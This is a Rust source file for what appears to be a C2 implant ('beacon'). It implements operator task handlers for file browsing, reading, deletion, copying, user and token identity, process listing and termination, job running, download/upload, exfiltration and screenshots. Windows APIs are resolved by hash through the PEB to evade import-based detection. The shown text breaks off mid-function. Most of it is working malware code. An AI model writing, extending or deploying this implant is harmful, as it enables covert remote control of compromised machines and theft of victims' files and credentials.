//! Command handlers (port of `src_beacon/src/tasks/`): the file set first
//! (pwd/cd/ls/cat); process, tokens, SOCKS5, forwarding and jobs come with
//! the next iterations. Dispatch is typed and exhaustive: a command the
//! server can send without a matching handler is dropped from the pack
//! (the server keeps it hosted), never misparsed.
//!
//! Every handler resolves its APIs by FNV-64 hash through the instance's
//! kernel32 and writes its result record through the pure builders of
//! `specter_core::transport` — the byte formats live there, pinned by
//! tests against the server source (docs/WIRE.md).
//!
//! Phase 3 of the roadmap (docs/ETUDE-DE-FAISABILITE.md, section 8).

use core::ffi::c_void;

use specter_core::fnv::fnv1a64;
use specter_core::peb;
use specter_core::transport::{self, Task};
use specter_core::wire::Writer;

use crate::runtime::bootstrap::Instance;

const H_GET_CURRENT_DIRECTORY_A: u64 = fnv1a64(b"GetCurrentDirectoryA");
const H_SET_CURRENT_DIRECTORY_A: u64 = fnv1a64(b"SetCurrentDirectoryA");
const H_FIND_FIRST_FILE_A: u64 = fnv1a64(b"FindFirstFileA");
const H_FIND_NEXT_FILE_A: u64 = fnv1a64(b"FindNextFileA");
const H_FIND_CLOSE: u64 = fnv1a64(b"FindClose");
const H_CREATE_FILE_A: u64 = fnv1a64(b"CreateFileA");
const H_READ_FILE: u64 = fnv1a64(b"ReadFile");
const H_CLOSE_HANDLE: u64 = fnv1a64(b"CloseHandle");
const H_GET_LAST_ERROR: u64 = fnv1a64(b"GetLastError");
const H_CREATE_DIRECTORY_A: u64 = fnv1a64(b"CreateDirectoryA");
const H_REMOVE_DIRECTORY_A: u64 = fnv1a64(b"RemoveDirectoryA");
const H_DELETE_FILE_A: u64 = fnv1a64(b"DeleteFileA");
const H_COPY_FILE_A: u64 = fnv1a64(b"CopyFileA");
const H_MOVE_FILE_A: u64 = fnv1a64(b"MoveFileA");
const H_GET_FILE_ATTRIBUTES_A: u64 = fnv1a64(b"GetFileAttributesA");
const H_LOOKUP_ACCOUNT_SID_A: u64 = fnv1a64(b"LookupAccountSidA");
const H_GET_LOGICAL_DRIVES: u64 = fnv1a64(b"GetLogicalDrives");
const H_GET_DRIVE_TYPE_A: u64 = fnv1a64(b"GetDriveTypeA");
const H_CREATE_TOOLHELP32_SNAPSHOT: u64 = fnv1a64(b"CreateToolhelp32Snapshot");
const H_PROCESS32_FIRST_W: u64 = fnv1a64(b"Process32FirstW");
const H_PROCESS32_NEXT_W: u64 = fnv1a64(b"Process32NextW");
const H_PROCESS_ID_TO_SESSION_ID: u64 = fnv1a64(b"ProcessIdToSessionId");
const H_IS_WOW64_PROCESS: u64 = fnv1a64(b"IsWow64Process");
const H_OPEN_PROCESS: u64 = fnv1a64(b"OpenProcess");
const H_TERMINATE_PROCESS: u64 = fnv1a64(b"TerminateProcess");
const H_OPEN_PROCESS_TOKEN: u64 = fnv1a64(b"OpenProcessToken");
const H_GET_TOKEN_INFORMATION: u64 = fnv1a64(b"GetTokenInformation");
const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");
const H_WRITE_FILE: u64 = fnv1a64(b"WriteFile");

/// WIN32_FIND_DATAA tail: attributes at +0, ftLastWriteTime at +0x14,
/// size (high:low) at +0x1C/+0x20, cFileName at +0x2C.
const FIND_DATA_SIZE: usize = 0x140;
const FIND_OFF_ATTR: usize = 0;
const FIND_OFF_WRITE_TIME: usize = 0x14;
const FIND_OFF_SIZE_HIGH: usize = 0x1C;
const FIND_OFF_SIZE_LOW: usize = 0x20;
const FIND_OFF_NAME: usize = 0x2C;

const GENERIC_READ: u32 = 0x8000_0000;
const FILE_SHARE_READ: u32 = 0x0000_0001;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x0000_0010;
/// 1970-01-01 in Windows FILETIME ticks (100 ns).
const FILETIME_UNIX_EPOCH: u64 = 116_444_736_000_000_000;

/// The CAT read cap of the native dialog ("first 2048 bytes").
const CAT_CAP: usize = 2048;
/// LS entry cap: results beyond this are silently truncated (the listing
/// stays bounded on both sides of the wire).
const LS_MAX_ENTRIES: u32 = 128;
const LS_NAME_CAP: usize = 64;

/// Dispatch one task; the result record lands in `results` for the next
/// POST. Failures write a COMMAND_ERROR record, never silence.
///
/// # Safety
///
/// Beacon thread; instance stored in the TEB.
pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut Writer) {
    let kernel32 = instance.kernel32;
    if kernel32.is_null() {
        return; // resolution impossible before bootstrap — nothing to report
    }
    match task {
        Task::Pwd => pwd(kernel32, id, results),
        Task::Cd { .. } => cd(kernel32, &task, id, results),
        Task::Ls { .. } => ls(kernel32, &task, id, results),
        Task::Cat { .. } => cat(kernel32, &task, id, results),
        Task::Mkdir { .. } => mkdir(kernel32, &task, id, results),
        Task::Rm { .. } => rm(kernel32, &task, id, results),
        Task::Cp { .. } => copy_move(kernel32, &task, id, results, true),
        Task::Mv { .. } => copy_move(kernel32, &task, id, results, false),
        Task::Getuid => getuid(kernel32, id, results),
        Task::Disks => disks(kernel32, id, results),
        Task::PsList => ps_list(kernel32, id, results),
        Task::PsKill { pid } => ps_kill(kernel32, pid, id, results),
        Task::PsRun { .. } => ps_run(instance, &task, id, results),
        Task::JobsList => jobs_list(instance, id, results),
        Task::JobsKill { job_id } => jobs_kill(instance, job_id, id, results),
        Task::Download { .. } => download_start(instance, &task, id, results),
        Task::Upload { .. } => upload_write(instance, &task, id, results),
        Task::Exfil { action, file_id } => exfil(instance, action, file_id, id, results),
        Task::Screenshot => screenshot_start(instance, id, results),
        Task::Sleep { .. } | Task::Terminate => {}
    }
}

/// Copy raw path bytes into a NUL-terminated API buffer.
fn c_path_bytes(path: &[u8], buf: &mut [u8]) -> Option<usize> {
    if path.len() + 1 > buf.len() {
        return None;
    }
    let mut i = 0;
    while i < path.len() {
        buf[i] = path[i];
        i += 1;
    }
    buf[path.len()] = 0;
    Some(path.len())
}

/// Copy a task's primary path into a NUL-terminated API buffer.
fn c_path(task: &Task, buf: &mut [u8]) -> Option<usize> {
    c_path_bytes(task.path(), buf)
}

unsafe fn pwd(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_GET_CURRENT_DIRECTORY_A);
    if p.is_null() {
        return;
    }
    let getcwd = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(u32, *mut u8) -> u32,
    >(p as *const core::ffi::c_void);
    let mut buf = [0u8; 260];
    let n = getcwd(259, buf.as_mut_ptr());
    if n == 0 || n as usize >= buf.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_path_result(results, id, transport::COMMAND_PWD, &buf[..n as usize]);
}

unsafe fn cd(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let set = peb::find_export(kernel32, H_SET_CURRENT_DIRECTORY_A);
    let get = peb::find_export(kernel32, H_GET_CURRENT_DIRECTORY_A);
    if set.is_null() || get.is_null() {
        return;
    }
    let set = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const u8) -> i32,
    >(set as *const core::ffi::c_void);
    let get = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(u32, *mut u8) -> u32,
    >(get as *const core::ffi::c_void);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    if set(path.as_ptr()) == 0 {
        error(kernel32, id, results);
        return;
    }
    let mut buf = [0u8; 260];
    let n = get(259, buf.as_mut_ptr());
    if n == 0 || n as usize >= buf.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_path_result(results, id, transport::COMMAND_CD, &buf[..n as usize]);
}

unsafe fn cat(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let create = peb::find_export(kernel32, H_CREATE_FILE_A);
    let read = peb::find_export(kernel32, H_READ_FILE);
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if create.is_null() || read.is_null() || close.is_null() {
        return;
    }
    let create = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(
            *const u8,
            u32,
            u32,
            *const c_void,
            u32,
            u32,
            *const c_void,
        ) -> isize,
    >(create as *const core::ffi::c_void);
    let read = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32,
    >(read as *const core::ffi::c_void);
    let close = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize) -> i32,
    >(close as *const core::ffi::c_void);

    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    let handle = create(
        path.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ,
        core::ptr::null(),
        OPEN_EXISTING,
        0,
        core::ptr::null(),
    );
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }
    let mut buf = [0u8; CAT_CAP];
    let mut got: u32 = 0;
    let ok = read(
        handle,
        buf.as_mut_ptr(),
        CAT_CAP as u32,
        &mut got,
        core::ptr::null(),
    );
    close(handle);
    if ok == 0 {
        error(kernel32, id, results);
        return;
    }
    // Whole-record copy (see ls): the record lands entirely or degrades
    // to the small error ack.
    let mut scratch = [0u8; CAT_CAP + 320];
    let mut cw = Writer::new(&mut scratch);
    if !transport::push_cat_result(&mut cw, id, task.path(), &buf[..got as usize]) {
        return;
    }
    let record = cw.written_bytes();
    if results.remaining() < record.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = results.push(record);
}

unsafe fn ls(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let first = peb::find_export(kernel32, H_FIND_FIRST_FILE_A);
    let next = peb::find_export(kernel32, H_FIND_NEXT_FILE_A);
    let close = peb::find_export(kernel32, H_FIND_CLOSE);
    if first.is_null() || next.is_null() || close.is_null() {
        return;
    }
    let first = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const u8, *mut u8) -> isize,
    >(first as *const core::ffi::c_void);
    let next = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize, *mut u8) -> i32,
    >(next as *const core::ffi::c_void);
    let close = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize) -> i32,
    >(close as *const core::ffi::c_void);

    // Search path: the directory (or pattern) plus `\*` when no wildcard
    // is present — the server strips the suffix for display.
    let mut search = [0u8; 264];
    let path = task.path();
    let root_len = path.len();
    if root_len + 3 > search.len() {
        error(kernel32, id, results);
        return;
    }
    let mut i = 0;
    while i < path.len() {
        search[i] = path[i];
        i += 1;
    }
    if root_len == 0 || search[root_len - 1] != b'*' {
        search[root_len] = b'\\';
        search[root_len + 1] = b'*';
        search[root_len + 2] = 0;
    } else {
        // Pattern given: the raw argument is the search path.
        search[root_len] = 0;
    }

    let mut data = [0u8; FIND_DATA_SIZE];
    let handle = first(search.as_ptr(), data.as_mut_ptr());
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }

    // Entries land in a scratch writer first: the count precedes them.
    let mut scratch = [0u8; 8192];
    let mut sw = Writer::new(&mut scratch);
    let mut count: u32 = 0;
    loop {
        // name: bounded NUL-terminated read
        let mut nlen = 0usize;
        while nlen < LS_NAME_CAP && data[FIND_OFF_NAME + nlen] != 0 {
            nlen += 1;
        }
        let size = ((data[FIND_OFF_SIZE_HIGH] as u64) << 32) | (data[FIND_OFF_SIZE_LOW] as u64);
        let ft = u64::from_le_bytes([
            data[FIND_OFF_WRITE_TIME],
            data[FIND_OFF_WRITE_TIME + 1],
            data[FIND_OFF_WRITE_TIME + 2],
            data[FIND_OFF_WRITE_TIME + 3],
            data[FIND_OFF_WRITE_TIME + 4],
            data[FIND_OFF_WRITE_TIME + 5],
            data[FIND_OFF_WRITE_TIME + 6],
            data[FIND_OFF_WRITE_TIME + 7],
        ]);
        let mut date = 0u64;
        if ft >= FILETIME_UNIX_EPOCH {
            date = (ft - FILETIME_UNIX_EPOCH) / 10_000_000;
        }
        let is_dir = data[FIND_OFF_ATTR] as u32 & FILE_ATTRIBUTE_DIRECTORY != 0;
        if !transport::push_ls_entry(
            &mut sw,
            is_dir,
            size,
            date as u32,
            &data[FIND_OFF_NAME..FIND_OFF_NAME + nlen],
        ) {
            break;
        }
        count += 1;
        if count >= LS_MAX_ENTRIES {
            break;
        }
        if next(handle, data.as_mut_ptr()) == 0 {
            break;
        }
    }
    close(handle);

    // Root for display: the argument without a trailing `\*` suffix.
    let mut root_end = path.len();
    if root_end >= 2 && path[root_end - 1] == b'*' && path[root_end - 2] == b'\\' {
        root_end -= 2;
    }
    let root = &task.path()[..root_end];

    // Whole-record copy: the header and the entries land in the cycle
    // queue entirely or not at all — a truncated listing (count vs
    // entries) would fail the server's packer and lose every result of
    // the cycle. An oversized record degrades to the small error ack.
    let mut header = [0u8; 320];
    let mut hw = Writer::new(&mut header);
    if !transport::push_ls_result_header(&mut hw, id, root, count) {
        return;
    }
    let hdr = hw.written_bytes();
    let entries = sw.written_bytes();
    if results.remaining() < hdr.len() + entries.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = results.push(hdr);
    let _ = results.push(entries);
}

unsafe fn mkdir(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_CREATE_DIRECTORY_A);
    if p.is_null() {
        return;
    }
    let create = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const u8, *const c_void) -> i32,
    >(p as *const core::ffi::c_void);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    if create(path.as_ptr(), core::ptr::null()) == 0 {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_mkdir_result(results, id, task.path());
}

unsafe fn rm(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let attrs = peb::find_export(kernel32, H_GET_FILE_ATTRIBUTES_A);
    let remove_dir = peb::find_export(kernel32, H_REMOVE_DIRECTORY_A);
    let delete_file = peb::find_export(kernel32, H_DELETE_FILE_A);
    if attrs.is_null() || remove_dir.is_null() || delete_file.is_null() {
        return;
    }
    let attrs = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const u8) -> u32,
    >(attrs as *const core::ffi::c_void);
    let remove_dir = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const u8) -> i32,
    >(remove_dir as *const core::ffi::c_void);
    let delete_file = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const u8) -> i32,
    >(delete_file as *const core::ffi::c_void);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    // INVALID_FILE_ATTRIBUTES is 0xFFFFFFFF; the directory bit 0x10
    // decides between RemoveDirectoryA and DeleteFileA — the result
    // byte tells the server which message to render.
    let attributes = attrs(path.as_ptr());
    let is_dir = attributes != 0xFFFF_FFFF && attributes & FILE_ATTRIBUTE_DIRECTORY != 0;
    let ok = if is_dir {
        remove_dir(path.as_ptr()) != 0
    } else {
        delete_file(path.as_ptr()) != 0
    };
    if !ok {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_rm_result(results, id, is_dir);
}

unsafe fn copy_move(
    kernel32: *mut c_void,
    task: &Task,
    id: u32,
    results: &mut Writer,
    is_copy: bool,
) {
    let p = if is_copy {
        peb::find_export(kernel32, H_COPY_FILE_A)
    } else {
        peb::find_export(kernel32, H_MOVE_FILE_A)
    };
    if p.is_null() {
        return;
    }
    let mut src = [0u8; 260];
    let mut dst = [0u8; 260];
    if c_path_bytes(task.path(), &mut src).is_none() {
        error(kernel32, id, results);
        return;
    }
    if c_path_bytes(task.dst(), &mut dst).is_none() {
        error(kernel32, id, results);
        return;
    }
    let ok = if is_copy {
        // bFailIfExists = FALSE: overwrite like the native dialog.
        let copy = core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(*const u8, *const u8, i32) -> i32,
        >(p as *const core::ffi::c_void);
        copy(src.as_ptr(), dst.as_ptr(), 0) != 0
    } else {
        let mv = core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(*const u8, *const u8) -> i32,
        >(p as *const core::ffi::c_void);
        mv(src.as_ptr(), dst.as_ptr()) != 0
    };
    if !ok {
        error(kernel32, id, results);
        return;
    }
    let command = if is_copy {
        transport::COMMAND_COPY
    } else {
        transport::COMMAND_MV
    };
    let _ = transport::push_plain_result(results, id, command);
}

/// Process identity of an open handle: (arch byte, elevated, domain,
/// username) — best effort, every failure degrades to defaults.
/// `arch`: 0 x86-on-x64, 1 x64, 0xFF unknown.
unsafe fn proc_identity(
    kernel32: *mut c_void,
    handle: isize,
) -> (u8, bool, [u8; 32], u16, [u8; 32], u16) {
    let mut domain = [0u8; 32];
    let mut username = [0u8; 32];
    let mut dlen = 0u16;
    let mut ulen = 0u16;
    let mut arch = 0xFFu8;
    let mut elevated = false;

    if !kernel32.is_null() && handle != 0 && handle != -1 {
        let wow = peb::find_export(kernel32, H_IS_WOW64_PROCESS);
        if !wow.is_null() {
            let mut is_wow: i32 = 0;
            let wow = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(isize, *mut i32) -> i32,
            >(wow as *const core::ffi::c_void);
            if wow(handle, &mut is_wow) != 0 {
                arch = if is_wow != 0 { 0 } else { 1 };
            }
        }
    }

    // Token: elevation + user SID.
    if !kernel32.is_null() {
        // advapi32 is only needed for the token trio; resolve through the
        // PEB the way sysinfo does (advapi32 is in the PEB of any process
        // that resolved GetUserNameA; otherwise the fields stay default).
        let advapi32 =
            specter_core::peb::find_module(crate::runtime::bootstrap::get_peb(), H_ADVAPI32);
        if !advapi32.is_null() {
            let open_token = peb::find_export(advapi32, H_OPEN_PROCESS_TOKEN);
            let get_info = peb::find_export(advapi32, H_GET_TOKEN_INFORMATION);
            let lookup = peb::find_export(advapi32, H_LOOKUP_ACCOUNT_SID_A);
            if !open_token.is_null() && !get_info.is_null() && !lookup.is_null() {
                let open_token = core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(isize, u32, *mut isize) -> i32,
                >(open_token as *const core::ffi::c_void);
                let get_info = core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(isize, u32, *mut c_void, u32, *mut u32) -> i32,
                >(get_info as *const core::ffi::c_void);
                let lookup = core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(
                        *const c_void,
                        *const c_void,
                        *mut u8,
                        *mut u32,
                        *mut u8,
                        *mut u32,
                        *mut u32,
                    ) -> i32,
                >(lookup as *const core::ffi::c_void);
                let mut token: isize = 0;
                if open_token(handle, 0x0008, &mut token) != 0 {
                    let mut elev: u32 = 0;
                    let mut ret: u32 = 0;
                    if get_info(token, 20, &mut elev as *mut u32 as *mut c_void, 4, &mut ret) != 0 {
                        elevated = elev != 0;
                    }
                    // TOKEN_USER: a SID pointer at offset 0.
                    let mut sid_buf = [0u8; 64];
                    if get_info(token, 1, sid_buf.as_mut_ptr() as *mut c_void, 64, &mut ret) != 0 {
                        let sid = u64::from_le_bytes([
                            sid_buf[0], sid_buf[1], sid_buf[2], sid_buf[3], sid_buf[4], sid_buf[5],
                            sid_buf[6], sid_buf[7],
                        ]) as *const c_void;
                        if !sid.is_null() {
                            let mut dsize: u32 = 32;
                            let mut usize_: u32 = 32;
                            let mut use_: u32 = 0;
                            // LookupAccountSidA(lpSystem, pSid,
                            //   Name=&username, &cbName,
                            //   ReferencedDomainName=&domain, &cbDomain, &use)
                            if lookup(
                                core::ptr::null(),
                                sid,
                                username.as_mut_ptr(),
                                &mut usize_,
                                domain.as_mut_ptr(),
                                &mut dsize,
                                &mut use_,
                            ) != 0
                            {
                                dlen = dsize as u16;
                                ulen = usize_ as u16;
                            }
                        }
                    }
                    if !kernel32.is_null() {
                        let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
                        if !close.is_null() {
                            (core::mem::transmute::<
                                *const core::ffi::c_void,
                                unsafe extern "system" fn(isize) -> i32,
                            >(close as *const core::ffi::c_void))(token);
                        }
                    }
                }
            }
        }
    }
    (arch, elevated, domain, dlen, username, ulen)
}

unsafe fn getuid(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    // Current process identity: pseudo-handle -1 covers the token.
    let (arch, elevated, domain, dlen, username, ulen) = proc_identity(kernel32, -1);
    let _ = arch; // getuid reports elevation only (the native format)
    let _ = transport::push_getuid_result(
        results,
        id,
        elevated,
        &domain[..dlen as usize],
        &username[..ulen as usize],
    );
}

unsafe fn disks(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let drives = peb::find_export(kernel32, H_GET_LOGICAL_DRIVES);
    let dtype = peb::find_export(kernel32, H_GET_DRIVE_TYPE_A);
    if drives.is_null() || dtype.is_null() {
        return;
    }
    let drives = core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn() -> u32>(
        drives as *const core::ffi::c_void,
    );
    let dtype = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const u8) -> u32,
    >(dtype as *const core::ffi::c_void);
    let mask = drives();
    if mask == 0 {
        error(kernel32, id, results);
        return;
    }
    let mut roots = [b'A'; 26];
    let mut count = 0usize;
    let mut i = 0u32;
    while i < 26 {
        if mask & (1u32 << i) != 0 {
            roots[count] = b'A' + i as u8;
            count += 1;
        }
        i += 1;
    }
    // Whole-record copy (see ls): header + entries, all or nothing.
    let mut scratch = [0u8; 192];
    let mut hw = Writer::new(&mut scratch);
    if !transport::push_disks_header(&mut hw, id, count as u32) {
        return;
    }
    let mut e = 0usize;
    while e < count {
        let letter = roots[e];
        let mut path = [0u8; 4];
        path[0] = letter;
        path[1] = b':';
        path[2] = b'\\';
        let drive_type = dtype(path.as_ptr());
        if !transport::push_disks_entry(&mut hw, letter, drive_type) {
            return;
        }
        e += 1;
    }
    let record = hw.written_bytes();
    if results.remaining() < record.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = results.push(record);
}

/// PROCESSENTRY32W offsets (x64): dwSize +0, pid +8, ppid +0x20,
/// szExeFile (wide) +0x2C — struct size 0x238. Pinned empirically on the
/// real VM (BOF dump of the filled entry): reading the name at +0x30
/// dropped the first 2 wchars of every process name.
const PE32W_SIZE: usize = 0x238;
const PE32W_OFF_PID: usize = 0x08;
const PE32W_OFF_PPID: usize = 0x20;
const PE32W_OFF_NAME: usize = 0x2C;
const PE32W_NAME_WCAP: usize = 64;
const PS_MAX_ENTRIES: u32 = 256;

unsafe fn ps_list(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let snap = peb::find_export(kernel32, H_CREATE_TOOLHELP32_SNAPSHOT);
    let first = peb::find_export(kernel32, H_PROCESS32_FIRST_W);
    let next = peb::find_export(kernel32, H_PROCESS32_NEXT_W);
    let session = peb::find_export(kernel32, H_PROCESS_ID_TO_SESSION_ID);
    let open = peb::find_export(kernel32, H_OPEN_PROCESS);
    if snap.is_null() || first.is_null() || next.is_null() || session.is_null() || open.is_null() {
        return;
    }
    let snap = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(u32, u32) -> isize,
    >(snap as *const core::ffi::c_void);
    let first = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize, *mut u8) -> i32,
    >(first as *const core::ffi::c_void);
    let next = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize, *mut u8) -> i32,
    >(next as *const core::ffi::c_void);
    let session = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(u32, *mut u32) -> i32,
    >(session as *const core::ffi::c_void);
    let open = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(u32, i32, u32) -> isize,
    >(open as *const core::ffi::c_void);

    let handle = snap(0x2, 0); // TH32CS_SNAPPROCESS
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }

    let mut entry = [0u8; PE32W_SIZE];
    entry[0] = PE32W_SIZE as u8;
    entry[1] = (PE32W_SIZE >> 8) as u8;

    // Entries land in a scratch writer first: the count precedes them.
    let mut scratch = [0u8; 12288];
    let mut sw = Writer::new(&mut scratch);
    let mut count: u32 = 0;
    let mut ok = first(handle, entry.as_mut_ptr()) != 0;
    while ok && count < PS_MAX_ENTRIES {
        let pid = u32::from_le_bytes([
            entry[PE32W_OFF_PID],
            entry[PE32W_OFF_PID + 1],
            entry[PE32W_OFF_PID + 2],
            entry[PE32W_OFF_PID + 3],
        ]);
        let ppid = u32::from_le_bytes([
            entry[PE32W_OFF_PPID],
            entry[PE32W_OFF_PPID + 1],
            entry[PE32W_OFF_PPID + 2],
            entry[PE32W_OFF_PPID + 3],
        ]);
        let mut sess = 0u32;
        let _ = session(pid, &mut sess);

        // Name: wide -> ACP bytes, bounded.
        let mut nlen = 0usize;
        while nlen < PE32W_NAME_WCAP && entry[PE32W_OFF_NAME + nlen * 2] != 0 {
            nlen += 1;
        }
        let mut name = [0u8; 64];
        let mut i = 0usize;
        while i < nlen {
            name[i] = if entry[PE32W_OFF_NAME + i * 2] < 0x80 {
                entry[PE32W_OFF_NAME + i * 2]
            } else {
                b'?'
            };
            i += 1;
        }

        // Best-effort identity (PROCESS_QUERY_LIMITED_INFORMATION).
        let ph = open(0x1000, 0, pid);
        let (arch, elevated, domain, dlen, username, ulen) = proc_identity(kernel32, ph);
        if ph != 0 {
            let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
            if !close.is_null() {
                (core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(isize) -> i32,
                >(close as *const core::ffi::c_void))(ph);
            }
        }

        let proc = transport::PsEntry {
            pid,
            ppid,
            session: sess,
            arch,
            elevated,
            domain: &domain[..dlen as usize],
            username: &username[..ulen as usize],
            name: &name[..nlen],
        };
        if !transport::push_ps_entry(&mut sw, &proc) {
            break;
        }
        count += 1;
        ok = next(handle, entry.as_mut_ptr()) != 0;
    }
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if !close.is_null() {
        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(isize) -> i32>(
            close as *const core::ffi::c_void,
        ))(handle);
    }

    if count == 0 {
        error(kernel32, id, results);
        return;
    }
    // Whole-record copy (see ls): header + entries, all or nothing.
    let mut header = [0u8; 32];
    let mut hw = Writer::new(&mut header);
    if !transport::push_ps_list_header(&mut hw, id, count) {
        return;
    }
    let hdr = hw.written_bytes();
    let entries = sw.written_bytes();
    if results.remaining() < hdr.len() + entries.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = results.push(hdr);
    let _ = results.push(entries);
}

unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer) {
    let open = peb::find_export(kernel32, H_OPEN_PROCESS);
    let term = peb::find_export(kernel32, H_TERMINATE_PROCESS);
    if open.is_null() || term.is_null() {
        return;
    }
    let open = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(u32, i32, u32) -> isize,
    >(open as *const core::ffi::c_void);
    let term = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize, u32) -> i32,
    >(term as *const core::ffi::c_void);
    // PROCESS_TERMINATE.
    let handle = open(0x0001, 0, pid);
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }
    let ok = term(handle, 1);
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if !close.is_null() {
        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(isize) -> i32>(
            close as *const core::ffi::c_void,
        ))(handle);
    }
    if ok == 0 {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_ps_kill_result(results, id, pid);
}

/// One active download: the handle stays open across cycles, one chunk
/// per POST (64 KiB — the cycle body budget, docs/WIRE.md).
/// Live job (ps run): process handle, pid and the stdout pipe's read
/// end. The id is the original task id — the operator's jobs kill.
#[derive(Clone, Copy)]
pub struct Job {
    pub id: u32,
    pub handle: isize,
    pub pid: u32,
    pub pipe_read: isize,
    pub killed: bool,
}

impl Job {
    pub const EMPTY: Job = Job {
        id: 0,
        handle: 0,
        pid: 0,
        pipe_read: 0,
        killed: false,
    };
}

/// Concurrent jobs cap (native keeps a vector; a small fixed array is the
/// no_std answer — the operator rarely runs more than a few).
pub const MAX_JOBS: usize = 8;

/// Per-drain stdout cap: keeps one job's output inside the 16 KiB cycle
/// results queue whatever the program writes (the pipe buffers the rest
/// for the next cycles; the writer blocks when full, like the native).
const JOB_DRAIN_CAP: usize = 4096;

pub struct DownloadState {
    pub task_id: u32,
    pub file_id: u32,
    pub handle: isize,
    pub size: u64,
    pub name: [u8; 64],
    pub name_len: u16,
    pub started: bool,
}

/// One active upload: chunks accumulate in a heap buffer until the
/// UPLOAD command names the destination.
pub struct UploadState {
    pub memory_id: u32,
    pub expected: usize,
    pub buf: *mut u8,
    pub cap: usize,
    pub received: usize,
}

/// Upload size cap: the heap buffer is allocated for the announced
/// size; anything beyond is refused (the upload task then errors).
const UPLOAD_MAX: usize = 8 * 1024 * 1024;

/// The download chunk pushed per cycle.
const DOWNLOAD_CHUNK: usize = 64 * 1024;

unsafe fn download_start(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
    let kernel32 = instance.kernel32;
    let create = peb::find_export(kernel32, H_CREATE_FILE_A);
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if create.is_null() || close.is_null() {
        return;
    }
    let create = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(
            *const u8,
            u32,
            u32,
            *const c_void,
            u32,
            u32,
            *const c_void,
        ) -> isize,
    >(create as *const core::ffi::c_void);
    // An open download closes first (one at a time).
    if let Some(dl) = instance.download.take() {
